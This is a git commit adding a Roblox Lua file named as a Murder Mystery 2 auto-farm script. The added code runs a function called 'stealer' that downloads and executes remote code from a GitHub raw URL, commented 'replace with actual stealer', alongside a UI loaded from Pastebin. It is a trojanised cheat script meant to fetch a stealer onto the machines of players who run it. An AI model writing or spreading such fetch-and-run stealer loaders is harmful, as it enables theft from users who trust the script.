1ad571e701cd8b7d0bb677d1fea669a709bdc7fb
TakZ-bit <tak72086@gmail.com>
2025-10-23 03:24:21 +0630

    Create MM2AUTOFARM2FIXED.lua

---
+++ MM2AUTOFARM2FIXED.lua
@@ -0,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/TakZ-bit/improved-potato/refs/heads/main/S.lua'))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://pastebin.com/raw/b2TF7CRu"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
